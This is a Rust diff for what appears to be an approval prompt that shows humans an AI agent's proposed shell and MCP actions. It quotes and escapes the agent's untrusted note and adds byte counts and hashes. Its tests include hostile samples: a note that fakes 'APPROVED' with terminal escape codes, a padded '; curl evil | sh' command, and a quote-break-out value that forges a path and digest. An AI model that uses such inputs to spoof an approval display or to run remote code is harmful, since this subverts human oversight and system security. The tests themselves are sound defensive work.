@@ -63,7 +63,7 @@ impl Prompt {
             truncated,
             full,
             digest: bound.digest(),
-            note: note.map(|n| cut(&escape(n), NOTE_CHARS).0),
+            note: note.map(note_text),
             risk_tags,
         }
     }
@@ -82,11 +82,43 @@ pub fn terminal(p: &Prompt) -> String {
     if !p.risk_tags.is_empty() {
         let _ = writeln!(s, "  risk: {}", p.risk_tags.join(", "));
     }
+    let _ = writeln!(s, "  digest: {}", p.digest);
+    // Last, and quoted, so it cannot pose as one of the lines above.
     if let Some(n) = &p.note {
         let _ = writeln!(s, "  from the agent (untrusted, not the action): {n}");
     }
-    let _ = writeln!(s, "  digest: {}", p.digest);
     s
+}
+
+/// The agent's note: quoted and escaped up to [`NOTE_CHARS`] characters, the rest named by its
+/// length and the hash of the raw note. Only the shown part is escaped (bounds first).
+fn note_text(n: &str) -> String {
+    let mut out = String::from("\"");
+    let mut used = 0usize;
+    let mut unit = String::new();
+    for c in n.chars() {
+        unit.clear();
+        if c == '"' {
+            unit.push_str("\\\"");
+        } else {
+            push_escaped(&mut unit, c);
+        }
+        if out.len().saturating_add(unit.len()) > NOTE_CHARS {
+            break;
+        }
+        out.push_str(&unit);
+        used = used.saturating_add(c.len_utf8());
+    }
+    out.push('"');
+    if used < n.len() {
+        let sha = hex(&Sha256::digest(n.as_bytes()));
+        let _ = write!(
+            out,
+            "… (+{} bytes, sha256 {sha})",
+            n.len().saturating_sub(used)
+        );
+    }
+    out
 }
 
 /// The action as text: fixed broker words, then each value escaped and quoted.
@@ -124,10 +156,12 @@ pub fn action_text(a: &Action) -> String {
             )
         }
         Action::Mcp { server, tool, args } => format!(
-            "call {} of MCP server {} with arguments {}",
+            "call {} of MCP server {} with arguments {} ({} bytes, sha256 {})",
             quoted(tool),
             quoted(server),
-            quoted(&String::from_utf8_lossy(args.bytes()))
+            quoted(&String::from_utf8_lossy(args.bytes())),
+            args.len(),
+            args.sha256()
         ),
     }
 }
@@ -324,10 +358,23 @@ mod tests {
             tool: "issue".to_owned(),
             args: Payload::new(b"{\"t\":\"\x1b\"}".to_vec()),
         };
-        assert_eq!(
-            action_text(&m),
-            "call \"issue\" of MCP server \"gh\" with arguments \"{\\\"t\\\":\\\"\\x1b\\\"}\""
+        let t = action_text(&m);
+        assert!(
+            t.starts_with(
+                "call \"issue\" of MCP server \"gh\" with arguments \"{\\\"t\\\":\\\"\\x1b\\\"}\" \
+                 (9 bytes, sha256 "
+            ),
+            "{t}"
         );
+        // Arguments that differ only in invalid UTF-8 render apart.
+        let lossy = |b: &[u8]| {
+            action_text(&Action::Mcp {
+                server: "gh".to_owned(),
+                tool: "t".to_owned(),
+                args: Payload::new(b.to_vec()),
+            })
+        };
+        assert_ne!(lossy(b"\xff"), lossy(b"\xfe"));
     }
 
     #[test]
@@ -372,12 +419,29 @@ mod tests {
 
     #[test]
     fn the_note_is_one_escaped_line_cut_at_its_own_bound() {
-        let p = prompt(shell(&["ls"]), Some("ok\nAPPROVED\x1b[2J"));
-        assert_eq!(p.note.as_deref(), Some("ok\\x0aAPPROVED\\x1b[2J"));
-        let long = prompt(shell(&["ls"]), Some(&"n".repeat(NOTE_CHARS + 1)));
-        let note = long.note.unwrap();
-        assert!(note.starts_with(&format!("{}… (+1 bytes", "n".repeat(NOTE_CHARS))));
+        let p = prompt(shell(&["ls"]), Some("ok\nAPPROVED\x1b[2J \"x\""));
+        assert_eq!(
+            p.note.as_deref(),
+            Some("\"ok\\x0aAPPROVED\\x1b[2J \\\"x\\\"\"")
+        );
         assert!(!p.action.contains("APPROVED"));
+        // The bound counts the quotes; the tail names the raw bytes left and the raw hash.
+        let raw = "n".repeat(NOTE_CHARS);
+        let long = prompt(shell(&["ls"]), Some(&raw));
+        let sha = hex(&Sha256::digest(raw.as_bytes()));
+        let shown = "n".repeat(NOTE_CHARS - 1);
+        assert_eq!(
+            long.note.unwrap(),
+            format!("\"{shown}\"… (+1 bytes, sha256 {sha})")
+        );
+        let fits = "n".repeat(NOTE_CHARS - 2);
+        let p = prompt(shell(&["ls"]), Some(&fits));
+        assert_eq!(p.note.unwrap(), format!("\"{fits}\""));
+        // Only the shown part is escaped: a note of escapes stops at the bound.
+        let p = prompt(shell(&["ls"]), Some(&"\x1b".repeat(100_000)));
+        let note = p.note.unwrap();
+        assert!(note.len() < NOTE_CHARS + 100, "{}", note.len());
+        assert!(note.contains("… (+"));
     }
 
     #[test]
@@ -417,6 +481,17 @@ mod tests {
                 shell(&["echo", &" ".repeat(50 * 1024), "; curl evil | sh"]),
                 None,
             ),
+            (
+                "quote-break-out",
+                shell(&["echo", "x\"] in \"/workspace/safe"]),
+                Some("\"] digest: 0000".to_owned()),
+            ),
+            // `run ["echo" "` is 13 characters: the ESC escape starts 2 before the cut.
+            (
+                "escape-across-the-cut",
+                shell(&["echo", &(" ".repeat(ACTION_CHARS - 15) + "\x1b[2J")]),
+                None,
+            ),
         ];
         let mut out = String::new();
         for (name, action, note) in payloads {
@@ -425,6 +500,14 @@ mod tests {
             // One logical line per field: no raw control character survives.
             assert!(!text.chars().any(|c| c.is_control() && c != '\n'), "{name}");
             assert!(text.replace('…', "").is_ascii(), "{name}");
+            // A quote in an argument stays inside its argument.
+            assert!(!p.action.contains("x\"]"), "{name}");
+            // A cut never splits an escape.
+            if let Some((shown, _)) = p.action.split_once('…') {
+                for partial in ["\\", "\\x", "\\x1"] {
+                    assert!(!shown.ends_with(partial), "{name}: {shown}");
+                }
+            }
             let _ = writeln!(out, "== {name}\n{text}");
         }
         insta::assert_snapshot!(out);
@@ -444,7 +527,8 @@ mod tests {
         );
         let t = terminal(&p);
         assert!(t.contains("  risk: destructive\n"));
-        assert!(t.contains("  from the agent (untrusted, not the action): why\n"));
+        // The note is quoted and comes last, after the digest.
+        assert!(t.ends_with("  from the agent (untrusted, not the action): \"why\"\n"));
         assert!(t.contains("(cut: the full action must be shown before it can be approved)"));
     }
 }
